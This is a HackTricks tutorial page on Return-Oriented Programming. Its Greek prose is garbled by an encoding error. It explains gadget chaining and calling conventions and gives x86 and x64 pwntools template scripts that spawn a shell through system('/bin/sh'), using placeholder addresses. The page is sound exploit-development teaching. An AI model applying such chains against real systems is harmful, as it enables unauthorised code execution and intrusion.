# ROP - Return Oriented Programing

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Î’Î±ÏƒÎ¹ÎºÎ­Ï‚ Î Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚**

**Return-Oriented Programming (ROP)** ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± Ï€ÏÎ¿Î·Î³Î¼Î­Î½Î· Ï„ÎµÏ‡Î½Î¹ÎºÎ® ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·Ï‚ Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÎ¹ Î¼Î­Ï„ÏÎ± Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ ÏŒÏ€Ï‰Ï‚ Ï„Î¿ **No-Execute (NX)** Î® Ï„Î¿ **Data Execution Prevention (DEP)**. Î‘Î½Ï„Î¯ Î½Î± ÎµÎ¹ÏƒÎ¬Î³ÎµÎ¹ ÎºÎ±Î¹ Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯ shellcode, Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÎµÏ„Î±Î¹ ÎºÎ¿Î¼Î¼Î¬Ï„Î¹Î± ÎºÏÎ´Î¹ÎºÎ± Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ Î®Î´Î· Ï€Î±ÏÏŒÎ½Ï„Î± ÏƒÏ„Î¿ Î´Ï…Î±Î´Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ Î® ÏƒÎµ Ï†Î¿ÏÏ„Ï‰Î¼Î­Î½ÎµÏ‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚, Î³Î½Ï‰ÏƒÏ„Î¬ Ï‰Ï‚ **"gadgets"**. ÎšÎ¬Î¸Îµ gadget ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Ï„ÎµÎ»ÎµÎ¹ÏÎ½ÎµÎ¹ Î¼Îµ Î¼Î¹Î± ÎµÎ½Ï„Î¿Î»Î® `ret` ÎºÎ±Î¹ ÎµÎºÏ„ÎµÎ»ÎµÎ¯ Î¼Î¹Î± Î¼Î¹ÎºÏÎ® Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î±, ÏŒÏ€Ï‰Ï‚ Î· Î¼ÎµÏ„Î±ÎºÎ¯Î½Î·ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Î¼ÎµÏ„Î±Î¾Ï ÎºÎ±Ï„Î±Ï‡Ï‰ÏÎ·Ï„ÏÎ½ Î® Î· ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Î±ÏÎ¹Î¸Î¼Î·Ï„Î¹ÎºÏÎ½ Ï€ÏÎ¬Î¾ÎµÏ‰Î½. Î£Ï…Î½Î´Î­Î¿Î½Ï„Î±Ï‚ Î±Ï…Ï„Î¬ Ï„Î± gadgets, Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎºÎ±Ï„Î±ÏƒÎºÎµÏ…Î¬ÏƒÎµÎ¹ Î­Î½Î± payload Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î±Ï…Î¸Î±Î¯ÏÎµÏ„ÎµÏ‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯ÎµÏ‚, Ï€Î±ÏÎ±ÎºÎ¬Î¼Ï€Ï„Î¿Î½Ï„Î±Ï‚ Î±Ï€Î¿Ï„ÎµÎ»ÎµÏƒÎ¼Î±Ï„Î¹ÎºÎ¬ Ï„Î¹Ï‚ Ï€ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯ÎµÏ‚ NX/DEP.

### Î ÏÏ‚ Î›ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ Ï„Î¿ ROP

1. **Hijacking Î¡Î¿Î®Ï‚ Î•Î»Î­Î³Ï‡Î¿Ï…**: Î ÏÏÏ„Î±, Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± hijack Ï„Î· ÏÎ¿Î® ÎµÎ»Î­Î³Ï‡Î¿Ï… ÎµÎ½ÏŒÏ‚ Ï€ÏÎ¿Î³ÏÎ¬Î¼Î¼Î±Ï„Î¿Ï‚, ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…ÏŒÎ¼ÎµÎ½Î¿Ï‚ Î¼Î¹Î± Ï…Ï€ÎµÏÏ‡ÎµÎ¯Î»Î¹ÏƒÎ· buffer Î³Î¹Î± Î½Î± Î±Î½Ï„Î¹ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÎµÎ¹ Î¼Î¹Î± Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Î¼Î­Î½Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· ÎµÏ€Î¹ÏƒÏ„ÏÎ¿Ï†Î®Ï‚ ÏƒÏ„Î¿ stack.
2. **Î£Ï…Î³ÎºÎ­Î½Ï„ÏÏ‰ÏƒÎ· Gadgets**: ÎŸ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± ÎµÏ€Î¹Î»Î­Î³ÎµÎ¹ Ï€ÏÎ¿ÏƒÎµÎºÏ„Î¹ÎºÎ¬ ÎºÎ±Î¹ ÏƒÏ…Î½Î´Î­ÎµÎ¹ gadgets Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Ï„Î¹Ï‚ ÎµÏ€Î¹Î¸Ï…Î¼Î·Ï„Î­Ï‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚. Î‘Ï…Ï„ÏŒ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï„Î· ÏÏÎ¸Î¼Î¹ÏƒÎ· Ï€Î±ÏÎ±Î¼Î­Ï„ÏÏ‰Î½ Î³Î¹Î± Î¼Î¹Î± ÎºÎ»Î®ÏƒÎ· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚, Ï„Î·Î½ ÎºÎ»Î®ÏƒÎ· Ï„Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚ (Ï€.Ï‡., `system("/bin/sh")`), ÎºÎ±Î¹ Ï„Î·Î½ Î´Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ· Î¿Ï€Î¿Î¹Î±ÏƒÎ´Î®Ï€Î¿Ï„Îµ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î·Ï‚ ÎºÎ±Î¸Î±ÏÎ¹ÏŒÏ„Î·Ï„Î±Ï‚ Î® Ï€ÏÏŒÏƒÎ¸ÎµÏ„Ï‰Î½ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÏÎ½.
3. **Î•ÎºÏ„Î­Î»ÎµÏƒÎ· Payload**: ÎŒÏ„Î±Î½ Î· ÎµÏ…Î¬Î»Ï‰Ï„Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· ÎµÏ€Î¹ÏƒÏ„ÏÎ­Ï†ÎµÎ¹, Î±Î½Ï„Î¯ Î½Î± ÎµÏ€Î¹ÏƒÏ„ÏÎ­ÏˆÎµÎ¹ ÏƒÎµ Î¼Î¹Î± Î½ÏŒÎ¼Î¹Î¼Î· Ï„Î¿Ï€Î¿Î¸ÎµÏƒÎ¯Î±, Î±ÏÏ‡Î¯Î¶ÎµÎ¹ Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯ Ï„Î·Î½ Î±Î»Ï…ÏƒÎ¯Î´Î± Ï„Ï‰Î½ gadgets.

### Î•ÏÎ³Î±Î»ÎµÎ¯Î±

Î£Ï…Î½Î®Î¸Ï‰Ï‚, Ï„Î± gadgets Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î²ÏÎµÎ¸Î¿ÏÎ½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ **[ROPgadget](https://github.com/JonathanSalwan/ROPgadget)**, **[ropper](https://github.com/sashs/Ropper)** Î® Î±Ï€ÎµÏ…Î¸ÎµÎ¯Î±Ï‚ Î±Ï€ÏŒ **pwntools** ([ROP](https://docs.pwntools.com/en/stable/rop/rop.html)).

## Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± ROP Chain ÏƒÎµ x86

### **x86 (32-bit) Î£Ï…Î¼Î²Î¬ÏƒÎµÎ¹Ï‚ ÎšÎ»Î®ÏƒÎ·Ï‚**

* **cdecl**: ÎŸ ÎºÎ±Î»ÏÎ½ ÎºÎ±Î¸Î±ÏÎ¯Î¶ÎµÎ¹ Ï„Î¿ stack. ÎŸÎ¹ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿Î¹ Ï„Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚ Ï„Î¿Ï€Î¿Î¸ÎµÏ„Î¿ÏÎ½Ï„Î±Î¹ ÏƒÏ„Î¿ stack Î¼Îµ Î±Î½Ï„Î¯ÏƒÏ„ÏÎ¿Ï†Î· ÏƒÎµÎ¹ÏÎ¬ (Î´ÎµÎ¾Î¹Î¬ Ï€ÏÎ¿Ï‚ Ï„Î± Î±ÏÎ¹ÏƒÏ„ÎµÏÎ¬). **ÎŸÎ¹ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿Î¹ Ï„Î¿Ï€Î¿Î¸ÎµÏ„Î¿ÏÎ½Ï„Î±Î¹ ÏƒÏ„Î¿ stack Î±Ï€ÏŒ Î´ÎµÎ¾Î¹Î¬ Ï€ÏÎ¿Ï‚ Ï„Î± Î±ÏÎ¹ÏƒÏ„ÎµÏÎ¬.**
* **stdcall**: Î Î±ÏÏŒÎ¼Î¿Î¹Î¿ Î¼Îµ Ï„Î¿ cdecl, Î±Î»Î»Î¬ Î¿ ÎºÎ±Î»Î¿ÏÎ¼ÎµÎ½Î¿Ï‚ ÎµÎ¯Î½Î±Î¹ Ï…Ï€ÎµÏÎ¸Ï…Î½Î¿Ï‚ Î³Î¹Î± Ï„Î¿Î½ ÎºÎ±Î¸Î±ÏÎ¹ÏƒÎ¼ÏŒ Ï„Î¿Ï… stack.

### **Î•ÏÏÎµÏƒÎ· Gadgets**

Î ÏÏÏ„Î±, Î±Ï‚ Ï…Ï€Î¿Î¸Î­ÏƒÎ¿Ï…Î¼Îµ ÏŒÏ„Î¹ Î­Ï‡Î¿Ï…Î¼Îµ ÎµÎ½Ï„Î¿Ï€Î¯ÏƒÎµÎ¹ Ï„Î± Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î± gadgets Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ Î´Ï…Î±Î´Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ Î® Ï„Î¹Ï‚ Ï†Î¿ÏÏ„Ï‰Î¼Î­Î½ÎµÏ‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚. Î¤Î± gadgets Ï€Î¿Ï… Î¼Î±Ï‚ ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Ï…Î½ ÎµÎ¯Î½Î±Î¹:

* `pop eax; ret`: Î‘Ï…Ï„ÏŒ Ï„Î¿ gadget Î±Ï†Î±Î¹ÏÎµÎ¯ Ï„Î·Î½ ÎºÎ¿ÏÏ…Ï†Î±Î¯Î± Ï„Î¹Î¼Î® Ï„Î¿Ï… stack ÏƒÏ„Î¿Î½ ÎºÎ±Ï„Î±Ï‡Ï‰ÏÎ·Ï„Î® `EAX` ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± ÎµÏ€Î¹ÏƒÏ„ÏÎ­Ï†ÎµÎ¹, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î¬Ï‚ Î¼Î±Ï‚ Î½Î± ÎµÎ»Î­Î³Î¾Î¿Ï…Î¼Îµ Ï„Î¿ `EAX`.
* `pop ebx; ret`: Î Î±ÏÏŒÎ¼Î¿Î¹Î¿ Î¼Îµ Ï„Î¿ Ï€Î±ÏÎ±Ï€Î¬Î½Ï‰, Î±Î»Î»Î¬ Î³Î¹Î± Ï„Î¿Î½ ÎºÎ±Ï„Î±Ï‡Ï‰ÏÎ·Ï„Î® `EBX`, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Ï„Î¿Î½ Î­Î»ÎµÎ³Ï‡Î¿ Ï„Î¿Ï… `EBX`.
* `mov [ebx], eax; ret`: ÎœÎµÏ„Î±Ï†Î­ÏÎµÎ¹ Ï„Î·Î½ Ï„Î¹Î¼Î® ÏƒÏ„Î¿ `EAX` ÏƒÏ„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Î¼Î½Î®Î¼Î·Ï‚ Ï€Î¿Ï… Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ `EBX` ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± ÎµÏ€Î¹ÏƒÏ„ÏÎ­Ï†ÎµÎ¹. Î‘Ï…Ï„ÏŒ ÏƒÏ…Ï‡Î½Î¬ Î¿Î½Î¿Î¼Î¬Î¶ÎµÏ„Î±Î¹ **write-what-where gadget**.
* Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Î­Ï‡Î¿Ï…Î¼Îµ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï„Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚ `system()` Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î·.

### **ROP Chain**

Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ **pwntools**, Ï€ÏÎ¿ÎµÏ„Î¿Î¹Î¼Î¬Î¶Î¿Ï…Î¼Îµ Ï„Î¿ stack Î³Î¹Î± Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Ï„Î·Ï‚ ROP chain Ï‰Ï‚ ÎµÎ¾Î®Ï‚, ÏƒÏ„Î¿Ï‡ÎµÏÎ¿Î½Ï„Î±Ï‚ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¿Ï…Î¼Îµ `system('/bin/sh')`, ÏƒÎ·Î¼ÎµÎ¹ÏÏƒÏ„Îµ Ï€ÏÏ‚ Î· Î±Î»Ï…ÏƒÎ¯Î´Î± Î¾ÎµÎºÎ¹Î½Î¬ Î¼Îµ:

1. ÎœÎ¹Î± ÎµÎ½Ï„Î¿Î»Î® `ret` Î³Î¹Î± ÏƒÎºÎ¿Ï€Î¿ÏÏ‚ ÎµÏ…Î¸Ï…Î³ÏÎ¬Î¼Î¼Î¹ÏƒÎ·Ï‚ (Ï€ÏÎ¿Î±Î¹ÏÎµÏ„Î¹ÎºÎ®)
2. Î”Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï„Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚ `system` (Ï…Ï€Î¿Î¸Î­Ï„Î¿Î½Ï„Î±Ï‚ ÏŒÏ„Î¹ Ï„Î¿ ASLR ÎµÎ¯Î½Î±Î¹ Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿ ÎºÎ±Î¹ Î³Î½Ï‰ÏƒÏ„Î® Î· libc, Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ„Î¿ [**Ret2lib**](ret2lib/))
3. Î˜Î­ÏƒÎ· Î³Î¹Î± Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· ÎµÏ€Î¹ÏƒÏ„ÏÎ¿Ï†Î®Ï‚ Î±Ï€ÏŒ Ï„Î¿ `system()`
4. Î”Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï„Î·Ï‚ ÏƒÏ…Î¼Î²Î¿Î»Î¿ÏƒÎµÎ¹ÏÎ¬Ï‚ `"/bin/sh"` (Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿Ï‚ Î³Î¹Î± Ï„Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· system)
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadc0de

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## ROP Chain in x64 Example

### **x64 (64-bit) Calling conventions**

* Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î· **System V AMD64 ABI** ÎºÎ»Î®ÏƒÎ· ÏƒÎµ Unix-like ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î±, ÏŒÏ€Î¿Ï… Î¿Î¹ **Ï€ÏÏÏ„ÎµÏ‚ Î­Î¾Î¹ Î±ÎºÎ­ÏÎ±Î¹ÎµÏ‚ Î® Î´ÎµÎ¯ÎºÏ„ÎµÏ‚ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿Î¹ Î¼ÎµÏ„Î±Ï†Î­ÏÎ¿Î½Ï„Î±Î¹ ÏƒÏ„Î¿Ï…Ï‚ ÎºÎ±Ï„Î±Ï‡Ï‰ÏÎ·Ï„Î­Ï‚ `RDI`, `RSI`, `RDX`, `RCX`, `R8`, ÎºÎ±Î¹ `R9`**. Î ÏÏŒÏƒÎ¸ÎµÏ„ÎµÏ‚ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿Î¹ Î¼ÎµÏ„Î±Ï†Î­ÏÎ¿Î½Ï„Î±Î¹ ÏƒÏ„Î¿ ÏƒÏ„Î¿Î¯Î²Î±. Î— Ï„Î¹Î¼Î® ÎµÏ€Î¹ÏƒÏ„ÏÎ¿Ï†Î®Ï‚ Ï„Î¿Ï€Î¿Î¸ÎµÏ„ÎµÎ¯Ï„Î±Î¹ ÏƒÏ„Î¿ `RAX`.
* Î— ÎºÎ»Î®ÏƒÎ· **Windows x64** Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ `RCX`, `RDX`, `R8`, ÎºÎ±Î¹ `R9` Î³Î¹Î± Ï„Î¹Ï‚ Ï€ÏÏÏ„ÎµÏ‚ Ï„Î­ÏƒÏƒÎµÏÎ¹Ï‚ Î±ÎºÎ­ÏÎ±Î¹ÎµÏ‚ Î® Î´ÎµÎ¯ÎºÏ„ÎµÏ‚ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÎ¿Ï…Ï‚, Î¼Îµ Ï€ÏÏŒÏƒÎ¸ÎµÏ„ÎµÏ‚ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÎ¿Ï…Ï‚ Î½Î± Î¼ÎµÏ„Î±Ï†Î­ÏÎ¿Î½Ï„Î±Î¹ ÏƒÏ„Î¿ ÏƒÏ„Î¿Î¯Î²Î±. Î— Ï„Î¹Î¼Î® ÎµÏ€Î¹ÏƒÏ„ÏÎ¿Ï†Î®Ï‚ Ï„Î¿Ï€Î¿Î¸ÎµÏ„ÎµÎ¯Ï„Î±Î¹ ÏƒÏ„Î¿ `RAX`.
* **ÎšÎ±Ï„Î±Ï‡Ï‰ÏÎ·Ï„Î­Ï‚**: ÎŸÎ¹ 64-bit ÎºÎ±Ï„Î±Ï‡Ï‰ÏÎ·Ï„Î­Ï‚ Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½Î¿Ï…Î½ `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP`, ÎºÎ±Î¹ `R8` Î­Ï‰Ï‚ `R15`.

#### **Finding Gadgets**

Î“Î¹Î± Ï„Î¿Î½ ÏƒÎºÎ¿Ï€ÏŒ Î¼Î±Ï‚, Î±Ï‚ ÎµÏ€Î¹ÎºÎµÎ½Ï„ÏÏ‰Î¸Î¿ÏÎ¼Îµ ÏƒÎµ gadgets Ï€Î¿Ï… Î¸Î± Î¼Î±Ï‚ ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎ¿Ï…Î½ Î½Î± ÏÏ…Î¸Î¼Î¯ÏƒÎ¿Ï…Î¼Îµ Ï„Î¿Î½ **RDI** ÎºÎ±Ï„Î±Ï‡Ï‰ÏÎ·Ï„Î® (Î³Î¹Î± Î½Î± Ï€ÎµÏÎ¬ÏƒÎ¿Ï…Î¼Îµ Ï„Î· **"/bin/sh"** ÏƒÏ…Î¼Î²Î¿Î»Î¿ÏƒÎµÎ¹ÏÎ¬ Ï‰Ï‚ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ ÏƒÏ„Î· **system()**) ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î½Î± ÎºÎ±Î»Î­ÏƒÎ¿Ï…Î¼Îµ Ï„Î· **system()** ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·. Î˜Î± Ï…Ï€Î¿Î¸Î­ÏƒÎ¿Ï…Î¼Îµ ÏŒÏ„Î¹ Î­Ï‡Î¿Ï…Î¼Îµ ÎµÎ½Ï„Î¿Ï€Î¯ÏƒÎµÎ¹ Ï„Î± ÎµÎ¾Î®Ï‚ gadgets:

* **pop rdi; ret**: Î‘Ï†Î±Î¹ÏÎµÎ¯ Ï„Î·Î½ ÎºÎ¿ÏÏ…Ï†Î±Î¯Î± Ï„Î¹Î¼Î® Ï„Î¿Ï… ÏƒÏ„Î¿Î¯Î²Î±Ï‚ ÏƒÏ„Î¿Î½ **RDI** ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± ÎµÏ€Î¹ÏƒÏ„ÏÎ­Ï†ÎµÎ¹. Î‘Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î¿ Î³Î¹Î± Î½Î± ÏÏ…Î¸Î¼Î¯ÏƒÎ¿Ï…Î¼Îµ Ï„Î·Î½ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ Î¼Î±Ï‚ Î³Î¹Î± Ï„Î· **system()**.
* **ret**: ÎœÎ¹Î± Î±Ï€Î»Î® ÎµÏ€Î¹ÏƒÏ„ÏÎ¿Ï†Î®, Ï‡ÏÎ®ÏƒÎ¹Î¼Î· Î³Î¹Î± Ï„Î·Î½ ÎµÏ…Î¸Ï…Î³ÏÎ¬Î¼Î¼Î¹ÏƒÎ· Ï„Î¿Ï… ÏƒÏ„Î¿Î¯Î²Î±Ï‚ ÏƒÎµ Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î± ÏƒÎµÎ½Î¬ÏÎ¹Î±.

ÎšÎ±Î¹ Î³Î½Ï‰ÏÎ¯Î¶Î¿Ï…Î¼Îµ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï„Î·Ï‚ **system()** ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚.

### **ROP Chain**

Î Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎµÎ¯Î½Î±Î¹ Î­Î½Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ **pwntools** Î³Î¹Î± Î½Î± ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹ ÎºÎ±Î¹ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î¼Î¹Î± ROP Î±Î»Ï…ÏƒÎ¯Î´Î± Î¼Îµ ÏƒÏ„ÏŒÏ‡Î¿ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· **system('/bin/sh')** ÏƒÎµ **x64**:
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
In this example:

* Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ¼Îµ Ï„Î¿ **`pop rdi; ret`** gadget Î³Î¹Î± Î½Î± Î¿ÏÎ¯ÏƒÎ¿Ï…Î¼Îµ Ï„Î¿ **`RDI`** ÏƒÏ„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï„Î¿Ï… **`"/bin/sh"`**.
* ÎšÎ¬Î½Î¿Ï…Î¼Îµ Î¬Î¼ÎµÏƒÎ· Î¼ÎµÏ„Î¬Î²Î±ÏƒÎ· ÏƒÏ„Î¿ **`system()`** Î¼ÎµÏ„Î¬ Ï„Î·Î½ ÏÏÎ¸Î¼Î¹ÏƒÎ· Ï„Î¿Ï… **`RDI`**, Î¼Îµ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï„Î¿Ï… **system()** ÏƒÏ„Î·Î½ Î±Î»Ï…ÏƒÎ¯Î´Î±.
